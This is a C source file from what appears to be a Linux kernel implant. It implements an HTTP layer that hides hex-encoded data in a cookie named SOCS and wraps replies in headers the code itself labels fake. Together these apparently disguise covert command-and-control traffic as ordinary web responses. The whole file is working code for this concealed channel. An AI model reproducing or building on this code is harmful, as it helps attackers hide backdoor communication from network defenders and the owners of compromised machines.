#include <linux/types.h>
#include <linux/string.h>
#include <linux/base64.h>

#include "../../sys/crypto.h"
#include "../../sys/mem.h"

#include "http.h"

#define HTTP_COOKIE_NAME "SOCS"
#define SEARCH_STRING HTTP_COOKIE_NAME "="

#define HTTP_COOKIE_HDR "Set-Cookie: " HTTP_COOKIE_NAME "=%.*s; expires=Sun, 25-Aug-2024 20:12:26 GMT; path=/; Secure; HttpOnly; priority=high\r\n"

#define HTTP_STAT_OK_NAME "200 OK"
#define HTTP_STAT_NOCONT_NAME "204 No Content"
#define HTTP_STAT_UNPROC_NAME "422 Unprocessable Content"
#define HTTP_STAT_INTLERR_NAME "500 Internal Server Error"

#define HTTP_PROTO "HTTP/1.1"
#define HTTP_FAKE_HEADERS "Vary: origin\r\n" \
                        "Access-Control-Allow-Credentials: true\r\n" \
                        "Access-Control-Allow-Methods: GET\r\n" \
                        "Access-Control-Allow-Headers: authorization\r\n" \
                        "Content-Type: text/html\r\n" \
                        "Server: ESF\r\n" \
                        "Content-Length: 0\r\n" \
                        "X-Xss-Protection: 0\r\n" \
                        "X-Frame-Options: SAMEORIGIN\r\n" \
                        "X-Content-Type-Options: nosniff\r\n"

#define HTTP_RES(name, cookie_hdr)  HTTP_PROTO " " name "\r\n" \
                        HTTP_FAKE_HEADERS \
                        cookie_hdr\
                        "\r"

#define HTTP_RES_OK HTTP_RES(HTTP_STAT_OK_NAME, HTTP_COOKIE_HDR)
#define HTTP_RES_NOCONT HTTP_RES(HTTP_STAT_NOCONT_NAME, "")
#define HTTP_RES_UNPROC HTTP_RES(HTTP_STAT_UNPROC_NAME, "")
#define HTTP_RES_INTLERR HTTP_RES(HTTP_STAT_INTLERR_NAME, "")

enum {
    HTTP_STAT_OK = 200,
    HTTP_STAT_NOCONT = 204,
    HTTP_STAT_UNPROC = 422,
    HTTP_STAT_INTLERR = 500
};

static int set_http_simple(const char *res_content, u8 **res_buf, size_t *res_buflen)
{
    int retv;

    *res_buflen = strlen(res_content);
    *res_buf = kzmalloc(*res_buflen, GFP_KERNEL);
    if (IS_ERR(*res_buf))
    {
        retv = PTR_ERR(*res_buf);
        *res_buf = NULL;
        *res_buflen = 0;
        return retv;
    }

    memcpy(*res_buf, res_content, *res_buflen);

    return 0;
}

static int set_http_ok(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    u8 *encoded_buf = NULL;
    size_t encoded_buflen = 0;
    int retv;

    retv = hex_encode(req_buf, req_buflen, &encoded_buf, &encoded_buflen);
    if (retv < 0)
        goto LAB_ERR_NO_RES_BUF;

    *res_buflen = strlen(HTTP_RES_OK) - 4 + encoded_buflen + 1;
    *res_buf = kzmalloc(*res_buflen, GFP_KERNEL);
    if (IS_ERR(*res_buf))
    {
        retv = PTR_ERR(*res_buf);
        goto LAB_ERR_NO_RES_BUF;
    }

    retv = snprintf(*res_buf, *res_buflen, HTTP_RES_OK, (int)encoded_buflen, encoded_buf);
    kzfree(encoded_buf, encoded_buflen);
    if (retv != *res_buflen - 1) // nullbyte
        goto LAB_ERR; // will not send internal server error due to complexity    
    
    (*res_buf)[*res_buflen-1] = '\n';

    return 0;

LAB_ERR:
    kzfree(*res_buf, *res_buflen);
LAB_ERR_NO_RES_BUF:
    *res_buf = NULL;
    *res_buflen = 0;

    return retv;
}

static int layer_http_decode(u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    char *search_start;
    char *cookie_start;
    size_t cookie_size;
    int retv;

    search_start = strnstr(req_buf, SEARCH_STRING, req_buflen);
    if (search_start == NULL)
    {
        retv = -EINVAL;
        goto LAB_OUT;
    }

    cookie_start = search_start + strlen(SEARCH_STRING);

    // strchr but with multiple chars, and stop when buflen is met
    for (cookie_size = 0; (void*)(cookie_start + cookie_size) < (void*)(req_buf + req_buflen) && IS_HEX(cookie_start[cookie_size]); cookie_size++);

    retv = hex_decode(cookie_start, cookie_size, res_buf, res_buflen);

LAB_OUT:
    kzfree(req_buf, req_buflen);

    if (retv < 0)
        return retv;

    return 0;
}

static int layer_http_encode(u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    int retv;

    if (req_buflen == 0)
        return set_http_simple(HTTP_RES_NOCONT, res_buf, res_buflen);

    retv = set_http_ok(req_buf, req_buflen, res_buf, res_buflen);
    kzfree(req_buf, req_buflen);

    return retv;
}

static int layer_http_handle_err(int retv, u8 **res_buf, size_t *res_buflen)
{
    if (retv == -EINVAL)
        return set_http_simple(HTTP_RES_UNPROC, res_buf, res_buflen);

    return set_http_simple(HTTP_RES_UNPROC, res_buf, res_buflen);
}


const struct pipeline_ops LAYER_HTTP_OPS = {
    .decode = layer_http_decode, 
    .encode = layer_http_encode, 
    .handle_err = layer_http_handle_err
};
